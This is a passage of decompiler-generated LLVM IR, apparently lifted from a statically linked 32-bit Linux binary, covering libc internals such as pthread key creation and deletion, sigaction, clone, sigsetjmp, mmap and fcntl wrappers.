  %v0_804f702 = load i32, i32* @ebx, align 4
  %v2_804f704 = udiv i32 %v0_804f702, 32
  store i32 %v2_804f704, i32* @esi, align 4
  %v2_804f707 = mul nuw nsw i32 %v2_804f704, 4
  %v3_804f707 = add i32 %v1_804f6fd, 236
  %v4_804f707 = add i32 %v3_804f707, %v2_804f707
  %v5_804f707 = inttoptr i32 %v4_804f707 to i32*
  %v6_804f707 = load i32, i32* %v5_804f707, align 4
  %v7_804f707 = icmp eq i32 %v6_804f707, 0
  store i32 %v1_804f6fd, i32* @edi, align 4
  %v1_804f711 = icmp eq i1 %v7_804f707, false
  br i1 %v1_804f711, label %dec_label_pc_804f733, label %dec_label_pc_804f713

dec_label_pc_804f713:                             ; preds = %dec_label_pc_804f6fd
  %v5_804f719 = call i32 @calloc(i64 32, i32 4, i32 %v1_804f6fd, i32 %v1_804f6fd)
  %v1_804f728 = icmp eq i32 %v5_804f719, 0
  br i1 %v1_804f728, label %dec_label_pc_804f74d, label %dec_label_pc_804f72c

dec_label_pc_804f72c:                             ; preds = %dec_label_pc_804f713
  %v1_804f72c = load i32, i32* @edi, align 4
  %v2_804f72c = load i32, i32* @esi, align 4
  %v3_804f72c = mul i32 %v2_804f72c, 4
  %v4_804f72c = add i32 %v1_804f72c, 236
  %v5_804f72c = add i32 %v4_804f72c, %v3_804f72c
  %v6_804f72c = inttoptr i32 %v5_804f72c to i32*
  store i32 %v5_804f719, i32* %v6_804f72c, align 4
  %v0_804f737.pre = load i32, i32* @ebx, align 4
  %v0_804f73a.pre = load i32, i32* @edi, align 4
  %v1_804f73a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f733

dec_label_pc_804f733:                             ; preds = %dec_label_pc_804f6fd, %dec_label_pc_804f72c
  %v1_804f73a = phi i32 [ %v2_804f704, %dec_label_pc_804f6fd ], [ %v1_804f73a.pre, %dec_label_pc_804f72c ]
  %v0_804f73a = phi i32 [ %v1_804f6fd, %dec_label_pc_804f6fd ], [ %v0_804f73a.pre, %dec_label_pc_804f72c ]
  %v0_804f737 = phi i32 [ %v0_804f702, %dec_label_pc_804f6fd ], [ %v0_804f737.pre, %dec_label_pc_804f72c ]
  %v1_804f737 = urem i32 %v0_804f737, 32
  %v2_804f73a = mul i32 %v1_804f73a, 4
  %v3_804f73a = add i32 %v0_804f73a, 236
  %v4_804f73a = add i32 %v3_804f73a, %v2_804f73a
  %v5_804f73a = inttoptr i32 %v4_804f73a to i32*
  %v6_804f73a = load i32, i32* %v5_804f73a, align 4
  %v3_804f741 = mul nuw nsw i32 %v1_804f737, 4
  %v4_804f741 = add i32 %v6_804f73a, %v3_804f741
  %v5_804f741 = inttoptr i32 %v4_804f741 to i32*
  store i32 %arg2, i32* %v5_804f741, align 4
  br label %dec_label_pc_804f74d

dec_label_pc_804f748:                             ; preds = %dec_label_pc_804f6f3, %entry
  br label %dec_label_pc_804f74d

dec_label_pc_804f74d:                             ; preds = %dec_label_pc_804f713, %dec_label_pc_804f733, %dec_label_pc_804f748
  %v0_804f750 = phi i32 [ 12, %dec_label_pc_804f713 ], [ 0, %dec_label_pc_804f733 ], [ 22, %dec_label_pc_804f748 ]
  ret i32 %v0_804f750

; uselistorder directives
  uselistorder i32 %v5_804f719, { 1, 0 }
  uselistorder i32 %v2_804f704, { 2, 1, 0 }
  uselistorder i32 %v0_804f702, { 1, 0 }
  uselistorder i32 %v1_804f6fd, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804f74d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f733, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_80653e0.199 to i32), i32* %stack_var_-28, align 4
  %v1_804f75f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80653e0.199 to i32))
  %v0_804f767 = load i32, i32* @ebx, align 4
  %v6_804f76d = icmp ugt i32 %v0_804f767, 1023
  br i1 %v6_804f76d, label %dec_label_pc_804f779, label %dec_label_pc_804f76f

dec_label_pc_804f76f:                             ; preds = %entry
  %v1_804f76f = mul i32 %v0_804f767, 8
  %v2_804f76f = add i32 %v1_804f76f, ptrtoint (i32* @global_var_80633e0.197 to i32)
  %v3_804f76f = inttoptr i32 %v2_804f76f to i32*
  %v4_804f76f = load i32, i32* %v3_804f76f, align 8
  %v5_804f76f = icmp eq i32 %v4_804f76f, 0
  %v1_804f777 = icmp eq i1 %v5_804f76f, false
  br i1 %v1_804f777, label %dec_label_pc_804f78d, label %dec_label_pc_804f779

dec_label_pc_804f779:                             ; preds = %dec_label_pc_804f76f, %entry
  store i32 ptrtoint (i32* @global_var_80653e0.199 to i32), i32* %stack_var_-28, align 4
  %v1_804f781 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80653e0.199 to i32))
  br label %dec_label_pc_804f7e8

dec_label_pc_804f78d:                             ; preds = %dec_label_pc_804f76f
  %v0_804f78d = load i32, i32* @global_var_8062a84.142, align 4
  %v10_804f78d = icmp eq i32 %v0_804f78d, -1
  store i32 0, i32* %v3_804f76f, align 8
  %v0_804f79f = load i32, i32* @ebx, align 4
  %v1_804f79f = mul i32 %v0_804f79f, 8
  %v2_804f79f = add i32 %v1_804f79f, ptrtoint (i32* @global_var_80633e4.198 to i32)
  %v3_804f79f = inttoptr i32 %v2_804f79f to i32*
  store i32 0, i32* %v3_804f79f, align 4
  br i1 %v10_804f78d, label %dec_label_pc_804f7d9, label %dec_label_pc_804f7ac

dec_label_pc_804f7ac:                             ; preds = %dec_label_pc_804f78d
  %v0_804f7ac = load i32, i32* %stack_var_-28, align 4
  %v1_804f7ac = call i32 @thread_self.19(i32 %v0_804f7ac)
  %v0_804f7b1 = load i32, i32* @ebx, align 4
  %v1_804f7b3 = urem i32 %v0_804f7b1, 32
  store i32 %v1_804f7b3, i32* @ebx, align 4
  %v2_804f7b6 = udiv i32 %v0_804f7b1, 32
  store i32 %v2_804f7b6, i32* @esi, align 4
  store i32 %v1_804f7ac, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f7bb

dec_label_pc_804f7bb:                             ; preds = %dec_label_pc_804f7d3, %dec_label_pc_804f7ac
  %v0_804f7c1 = phi i32 [ %v2_804f7d3, %dec_label_pc_804f7d3 ], [ %v1_804f7ac, %dec_label_pc_804f7ac ]
  %v1_804f7bb = add i32 %v0_804f7c1, 44
  %v2_804f7bb = inttoptr i32 %v1_804f7bb to i8*
  %v3_804f7bb = load i8, i8* %v2_804f7bb, align 1
  %v4_804f7bb = icmp eq i8 %v3_804f7bb, 0
  %v1_804f7bf = icmp eq i1 %v4_804f7bb, false
  br i1 %v1_804f7bf, label %dec_label_pc_804f7d3, label %dec_label_pc_804f7c1

dec_label_pc_804f7c1:                             ; preds = %dec_label_pc_804f7bb
  %v1_804f7c1 = load i32, i32* @esi, align 4
  %v2_804f7c1 = mul i32 %v1_804f7c1, 4
  %v3_804f7c1 = add i32 %v0_804f7c1, 236
  %v4_804f7c1 = add i32 %v3_804f7c1, %v2_804f7c1
  %v5_804f7c1 = inttoptr i32 %v4_804f7c1 to i32*
  %v6_804f7c1 = load i32, i32* %v5_804f7c1, align 4
  %v1_804f7c8 = icmp eq i32 %v6_804f7c1, 0
  br i1 %v1_804f7c8, label %dec_label_pc_804f7d3, label %dec_label_pc_804f7cc

dec_label_pc_804f7cc:                             ; preds = %dec_label_pc_804f7c1
  %v1_804f7cc = load i32, i32* @ebx, align 4
  %v2_804f7cc = mul i32 %v1_804f7cc, 4
  %v3_804f7cc = add i32 %v2_804f7cc, %v6_804f7c1
  %v4_804f7cc = inttoptr i32 %v3_804f7cc to i32*
  store i32 0, i32* %v4_804f7cc, align 4
  %v0_804f7d3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f7d3

dec_label_pc_804f7d3:                             ; preds = %dec_label_pc_804f7c1, %dec_label_pc_804f7bb, %dec_label_pc_804f7cc
  %v0_804f7d3 = phi i32 [ %v0_804f7c1, %dec_label_pc_804f7c1 ], [ %v0_804f7c1, %dec_label_pc_804f7bb ], [ %v0_804f7d3.pre, %dec_label_pc_804f7cc ]
  %v1_804f7d3 = inttoptr i32 %v0_804f7d3 to i32*
  %v2_804f7d3 = load i32, i32* %v1_804f7d3, align 4
  store i32 %v2_804f7d3, i32* %edx.global-to-local, align 4
  %v12_804f7d5 = icmp eq i32 %v2_804f7d3, %v1_804f7ac
  %v1_804f7d7 = icmp eq i1 %v12_804f7d5, false
  br i1 %v1_804f7d7, label %dec_label_pc_804f7bb, label %dec_label_pc_804f7d9

dec_label_pc_804f7d9:                             ; preds = %dec_label_pc_804f7d3, %dec_label_pc_804f78d
  store i32 ptrtoint (i32* @global_var_80653e0.199 to i32), i32* %stack_var_-28, align 4
  %v1_804f7e1 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80653e0.199 to i32))
  br label %dec_label_pc_804f7e8

dec_label_pc_804f7e8:                             ; preds = %dec_label_pc_804f779, %dec_label_pc_804f7d9
  %storemerge = phi i32 [ 22, %dec_label_pc_804f779 ], [ 0, %dec_label_pc_804f7d9 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_804f7d3, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder i32 236, { 0, 1, 2, 3, 5, 6, 7, 8, 4 }
  uselistorder i32 (i32)* @thread_self.19, { 5, 4, 0, 3, 1, 2, 6 }
  uselistorder i32* @global_var_8062a84.142, { 2, 3, 4, 0, 5, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_804f7e8, { 1, 0 }
  uselistorder label %dec_label_pc_804f7d3, { 2, 0, 1 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_80653e0.199 to i32), i32* %stack_var_-28, align 4
  %v1_804f7f9 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80653e0.199 to i32))
  store i32 %v1_804f7f9, i32* %eax.global-to-local, align 4
  %v0_804f83b.pr = load i32, i32* @ebx, align 4
  %v7_804f84110 = icmp sgt i32 %v0_804f83b.pr, 1023
  br i1 %v7_804f84110, label %dec_label_pc_804f843, label %dec_label_pc_804f803

dec_label_pc_804f803:                             ; preds = %entry, %dec_label_pc_804f83a
  %v0_804f83a11 = phi i32 [ %v1_804f83a, %dec_label_pc_804f83a ], [ %v0_804f83b.pr, %entry ]
  %v1_804f803 = mul i32 %v0_804f83a11, 8
  %v2_804f803 = add i32 %v1_804f803, ptrtoint (i32* @global_var_80633e0.197 to i32)
  %v3_804f803 = inttoptr i32 %v2_804f803 to i32*
  %v4_804f803 = load i32, i32* %v3_804f803, align 8
  %v5_804f803 = icmp eq i32 %v4_804f803, 0
  %v1_804f80b = icmp eq i1 %v5_804f803, false
  br i1 %v1_804f80b, label %dec_label_pc_804f83a, label %dec_label_pc_804f80d

dec_label_pc_804f80d:                             ; preds = %dec_label_pc_804f803
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80653e0.199 to i32), i32* %stack_var_-28, align 4
  store i32 1, i32* %v3_804f803, align 8
  %v0_804f824 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f824 = load i32, i32* @ebx, align 4
  %v2_804f824 = mul i32 %v1_804f824, 8
  %v3_804f824 = add i32 %v2_804f824, ptrtoint (i32* @global_var_80633e4.198 to i32)
  %v4_804f824 = inttoptr i32 %v3_804f824 to i32*
  store i32 %v0_804f824, i32* %v4_804f824, align 4
  %v0_804f82b = load i32, i32* %stack_var_-28, align 4
  %v1_804f82b = call i32 @pthread_mutex_unlock(i32 %v0_804f82b)
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v0_804f834 = load i32, i32* @ebx, align 4
  store i32 %v0_804f834, i32* %arg1, align 4
  br label %dec_label_pc_804f855

dec_label_pc_804f83a:                             ; preds = %dec_label_pc_804f803
  %v1_804f83a = add nsw i32 %v0_804f83a11, 1
  store i32 %v1_804f83a, i32* @ebx, align 4
  %v7_804f841 = icmp sgt i32 %v0_804f83a11, 1022
  br i1 %v7_804f841, label %dec_label_pc_804f843, label %dec_label_pc_804f803

dec_label_pc_804f843:                             ; preds = %dec_label_pc_804f83a, %entry
  store i32 ptrtoint (i32* @global_var_80653e0.199 to i32), i32* %stack_var_-28, align 4
  %v1_804f84b = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_80653e0.199 to i32))
  br label %dec_label_pc_804f855

dec_label_pc_804f855:                             ; preds = %dec_label_pc_804f80d, %dec_label_pc_804f843
  %storemerge = phi i32 [ 11, %dec_label_pc_804f843 ], [ 0, %dec_label_pc_804f80d ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804f83a, { 1, 0 }
  uselistorder i32 %v0_804f83a11, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80653e0.199 to i32), { 0, 5, 6, 1, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder label %dec_label_pc_804f855, { 1, 0 }
  uselistorder label %dec_label_pc_804f803, { 1, 0 }
}

define i32 @__restore_rt(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f85c:
  %v0_804f861 = load i32, i32* @ebx, align 4
  %v1_804f861 = inttoptr i32 %v0_804f861 to %sigcontext*
  %v2_804f861 = call i32 @sigreturn(%sigcontext* %v1_804f861)
  %v0_804f869 = load i32, i32* @ebx, align 4
  %v1_804f869 = inttoptr i32 %v0_804f869 to %sigcontext*
  %v2_804f869 = call i32 @sigreturn(%sigcontext* %v1_804f869)
  ret i32 %v2_804f869
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804f86b = load i32, i32* @esi, align 4
  %v0_804f86c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804f881 = icmp eq i32* %arg2, null
  br i1 %v1_804f881, label %dec_label_pc_804f8d5, label %dec_label_pc_804f885

dec_label_pc_804f885:                             ; preds = %entry
  %v2_804f885 = load i32, i32* %arg2, align 4
  store i32 %v2_804f885, i32* %stack_var_-148, align 4
  %v1_804f88e = add i32 %tmp11, 4
  %v3_804f8a0 = bitcast i32* %stack_var_-136 to i16*
  %v4_804f8a0 = call i32 @memcpy(i16* %v3_804f8a0, i32 %v1_804f88e, i32 128)
  br label %dec_label_pc_804f8d5

dec_label_pc_804f8d5:                             ; preds = %entry, %dec_label_pc_804f885
  %v1_804f8d7 = icmp eq i32 %arg3, 0
  br i1 %v1_804f8d7, label %dec_label_pc_804f8df, label %dec_label_pc_804f8db

dec_label_pc_804f8db:                             ; preds = %dec_label_pc_804f8d5
  %v2_804f8db = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804f8df

dec_label_pc_804f8df:                             ; preds = %dec_label_pc_804f8d5, %dec_label_pc_804f8db
  %v0_804f8ee = phi i32 [ 0, %dec_label_pc_804f8d5 ], [ %v2_804f8db, %dec_label_pc_804f8db ]
  br i1 %v1_804f881, label %dec_label_pc_804f8ec, label %dec_label_pc_804f8e5

dec_label_pc_804f8e5:                             ; preds = %dec_label_pc_804f8df
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804f8ec

dec_label_pc_804f8ec:                             ; preds = %dec_label_pc_804f8df, %dec_label_pc_804f8e5
  %v0_804f8ef = phi %sigaction* [ null, %dec_label_pc_804f8df ], [ %phitmp, %dec_label_pc_804f8e5 ]
  %v5_804f8f7 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804f8ef, i32 %v0_804f8ee, i32 8)
  store i32 %v5_804f8f7, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f8d7, label %dec_label_pc_804f93a, label %dec_label_pc_804f905

dec_label_pc_804f905:                             ; preds = %dec_label_pc_804f8ec
  %v2_804f905 = icmp slt i32 %v5_804f8f7, 0
  br i1 %v2_804f905, label %dec_label_pc_804f93a, label %dec_label_pc_804f909

dec_label_pc_804f909:                             ; preds = %dec_label_pc_804f905
  %v3_804f909 = load i32, i32* %stack_var_-288, align 4
  %v2_804f90d = inttoptr i32 %arg3 to i32*
  store i32 %v3_804f909, i32* %v2_804f90d, align 4
  %v2_804f915 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804f91a = add i32 %arg3, 4
  %v3_804f91e = inttoptr i32 %v1_804f91a to i16*
  %v4_804f91e = call i32 @memcpy(i16* %v3_804f91e, i32 %v2_804f915, i32 128)
  %v2_804f927 = add i32 %arg3, 132
  %v3_804f927 = inttoptr i32 %v2_804f927 to i32*
  %v2_804f934 = add i32 %arg3, 136
  %v3_804f934 = inttoptr i32 %v2_804f934 to i32*
  %v0_804f940.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f93a

dec_label_pc_804f93a:                             ; preds = %dec_label_pc_804f905, %dec_label_pc_804f8ec, %dec_label_pc_804f909
  %v0_804f940 = phi i32 [ %v5_804f8f7, %dec_label_pc_804f905 ], [ %v5_804f8f7, %dec_label_pc_804f8ec ], [ %v0_804f940.pre, %dec_label_pc_804f909 ]
  store i32 %v0_804f86c, i32* @ebx, align 4
  store i32 %v0_804f86b, i32* @esi, align 4
  ret i32 %v0_804f940

; uselistorder directives
  uselistorder i32 %v5_804f8f7, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804f8d7, { 1, 0 }
  uselistorder i1 %v1_804f881, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_804f93a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f8ec, { 1, 0 }
  uselistorder label %dec_label_pc_804f8df, { 1, 0 }
  uselistorder label %dec_label_pc_804f8d5, { 1, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 -22, i32* @eax, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804f951 = icmp eq i32 %arg1, 0
  br i1 %v1_804f951, label %dec_label_pc_804f9af, label %dec_label_pc_804f955

dec_label_pc_804f955:                             ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f959 = icmp eq i32 %arg2, 0
  br i1 %v1_804f959, label %dec_label_pc_804f9af, label %dec_label_pc_804f95d

dec_label_pc_804f95d:                             ; preds = %dec_label_pc_804f955
  %v1_804f95d = and i32 %arg2, -16
  %v1_804f960 = add i32 %v1_804f95d, -28
  store i32 %v1_804f960, i32* %ecx.global-to-local, align 4
  %v2_804f967 = add i32 %v1_804f95d, -16
  %v3_804f967 = inttoptr i32 %v2_804f967 to i32*
  store i32 %arg4, i32* %v3_804f967, align 16
  %v1_804f96e = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f96e = add i32 %v1_804f96e, 8
  %v3_804f96e = inttoptr i32 %v2_804f96e to i32*
  store i32 %arg1, i32* %v3_804f96e, align 4
  %v0_804f971 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f971 = add i32 %v0_804f971, 4
  %v2_804f971 = inttoptr i32 %v1_804f971 to i32*
  store i32 0, i32* %v2_804f971, align 4
  %v0_804f978 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f978 = inttoptr i32 %v0_804f978 to i32*
  store i32 0, i32* %v1_804f978, align 4
  %v0_804f97e = load i32, i32* @ebx, align 4
  store i32 %v0_804f97e, i32* %stack_var_-4, align 4
  %v0_804f97f = load i32, i32* @esi, align 4
  %v0_804f980 = load i32, i32* @edi, align 4
  store i32 %v0_804f980, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804f996 = load i32, i32* %stack_var_0, align 4
  %v4_804f996 = call i32 @clone(i32 %v0_804f980, i32 %v0_804f97f, i32 %v0_804f97e, i32 %v3_804f996)
  store i32 %v4_804f996, i32* @eax, align 4
  %v2_804f998 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f998, i32* @edi, align 4
  store i32 %v0_804f97f, i32* @esi, align 4
  %v2_804f99a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f99a, i32* @ebx, align 4
  %v2_804f99b = icmp slt i32 %v4_804f996, 0
  %v2_804f99d = icmp eq i1 %v2_804f99b, false
  br i1 %v2_804f99d, label %dec_label_pc_804f99f, label %dec_label_pc_804f9af

dec_label_pc_804f99f:                             ; preds = %dec_label_pc_804f95d
  %v1_804f99b = icmp eq i32 %v4_804f996, 0
  br i1 %v1_804f99b, label %dec_label_pc_804f9a2, label %dec_label_pc_804f9a1

dec_label_pc_804f9a1:                             ; preds = %dec_label_pc_804f99f
  ret i32 %v4_804f996

dec_label_pc_804f9a2:                             ; preds = %dec_label_pc_804f99f
  store i32 %v0_804f97f, i32* @ebp, align 4
  store i32 134543782, i32* %stack_var_-4, align 4
  call void @__pseudo_call(i32 %v2_804f99a)
  store i32 0, i32* @ebx, align 4
  call void @exit(i32 0)
  unreachable

dec_label_pc_804f9af:                             ; preds = %dec_label_pc_804f95d, %dec_label_pc_804f955, %entry
  %v0_804f9af = call i32 @__syscall_error()
  ret i32 %v0_804f9af

; uselistorder directives
  uselistorder i32 %v4_804f996, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804f97f, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__sigsetjmp(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* %stack_var_4, align 4
  store i32 %tmp2, i32* %eax.global-to-local, align 4
  %v0_804f9b8 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9b8, i32* %arg2, align 4
  %v0_804f9ba = load i32, i32* @esi, align 4
  %v2_804f9ba = add i32 %tmp2, 4
  %v3_804f9ba = inttoptr i32 %v2_804f9ba to i32*
  store i32 %v0_804f9ba, i32* %v3_804f9ba, align 4
  %v0_804f9bd = load i32, i32* @edi, align 4
  %v1_804f9bd = load i32, i32* %eax.global-to-local, align 4
  %v2_804f9bd = add i32 %v1_804f9bd, 8
  %v3_804f9bd = inttoptr i32 %v2_804f9bd to i32*
  store i32 %v0_804f9bd, i32* %v3_804f9bd, align 4
  %v2_804f9c0 = ptrtoint i32* %stack_var_4 to i32
  %v1_804f9c4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f9c4 = add i32 %v1_804f9c4, 16
  %v3_804f9c4 = inttoptr i32 %v2_804f9c4 to i32*
  store i32 %v2_804f9c0, i32* %v3_804f9c4, align 4
  %v1_804f9ca = load i32, i32* %eax.global-to-local, align 4
  %v2_804f9ca = add i32 %v1_804f9ca, 20
  %v3_804f9ca = inttoptr i32 %v2_804f9ca to i32*
  store i32 %arg1, i32* %v3_804f9ca, align 4
  %v0_804f9cd = load i32, i32* @ebp, align 4
  %v1_804f9cd = load i32, i32* %eax.global-to-local, align 4
  %v2_804f9cd = add i32 %v1_804f9cd, 12
  %v3_804f9cd = inttoptr i32 %v2_804f9cd to i32*
  store i32 %v0_804f9cd, i32* %v3_804f9cd, align 4
  %v0_804f9d0 = call i32 @__sigjmp_save()
  store i32 %v0_804f9d0, i32* %eax.global-to-local, align 4
  ret i32 %v0_804f9d0

; uselistorder directives
  uselistorder i32* %stack_var_4, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804f9d8 = load i32, i32* @ebx, align 4
  %v2_804f9df = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804f9df, i32* @ebx, align 4
  %v8_804f9e3 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804f9d8, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_804f9e3, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134563292)
  ret i32 %v8_804f9e3

; uselistorder directives
  uselistorder i32 %v8_804f9e3, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f9f4 = load i32, i32* @edi, align 4
  %v0_804f9f5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804fa0d = add i32 %arg2, -12
  %v6_804fa13 = icmp ugt i32 %v1_804fa0d, 2
  br i1 %v6_804fa13, label %dec_label_pc_804fa23, label %dec_label_pc_804fa15

dec_label_pc_804fa15:                             ; preds = %entry
  %v4_804fa19 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804fa0d)
  br label %dec_label_pc_804fa45

dec_label_pc_804fa23:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fa2b = call i32 @fcntl(i32 %v0_804f9f5)
  store i32 %v1_804fa2b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fa2b, -4095
  br i1 %tmp, label %dec_label_pc_804fa43, label %dec_label_pc_804fa37

dec_label_pc_804fa37:                             ; preds = %dec_label_pc_804fa23
  %v1_804fa37 = call i32 @__errno_location(i32 %v0_804f9f5)
  %v0_804fa3c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa3c = sub i32 0, %v0_804fa3c
  %v2_804fa3e = inttoptr i32 %v1_804fa37 to i32*
  store i32 %v1_804fa3c, i32* %v2_804fa3e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa43

dec_label_pc_804fa43:                             ; preds = %dec_label_pc_804fa23, %dec_label_pc_804fa37
  %v0_804fa43 = phi i32 [ %v1_804fa2b, %dec_label_pc_804fa23 ], [ -1, %dec_label_pc_804fa37 ]
  br label %dec_label_pc_804fa45

dec_label_pc_804fa45:                             ; preds = %dec_label_pc_804fa15, %dec_label_pc_804fa43
  %v0_804fa4a = phi i32 [ %v4_804fa19, %dec_label_pc_804fa15 ], [ %v0_804fa43, %dec_label_pc_804fa43 ]
  store i32 %v0_804f9f5, i32* @ebx, align 4
  store i32 %v0_804f9f4, i32* @edi, align 4
  ret i32 %v0_804fa4a

; uselistorder directives
  uselistorder i32 %v1_804fa2b, { 1, 0, 2 }
  uselistorder i32 %v0_804f9f5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa45, { 1, 0 }
  uselistorder label %dec_label_pc_804fa43, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa4c = load i32, i32* @edi, align 4
  store i32 %v0_804fa4c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_804fa64 = load i32, i32* @ebx, align 4
  %v1_804fa6c = call i32 @int80_syscall(i32 221)
  store i32 %v1_804fa6c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fa6c, -4095
  br i1 %tmp, label %dec_label_pc_804fa84, label %dec_label_pc_804fa78

dec_label_pc_804fa78:                             ; preds = %entry
  %v1_804fa78 = call i32 @__errno_location(i32 %v0_804fa64)
  %v0_804fa7d = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa7d = sub i32 0, %v0_804fa7d
  %v2_804fa7f = inttoptr i32 %v1_804fa78 to i32*
  store i32 %v1_804fa7d, i32* %v2_804fa7f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa84

dec_label_pc_804fa84:                             ; preds = %entry, %dec_label_pc_804fa78
  %v0_804fa87 = phi i32 [ %v1_804fa6c, %entry ], [ -1, %dec_label_pc_804fa78 ]
  %v2_804fa89 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa89, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fa87

; uselistorder directives
  uselistorder i32 %v1_804fa6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa84, { 1, 0 }
}

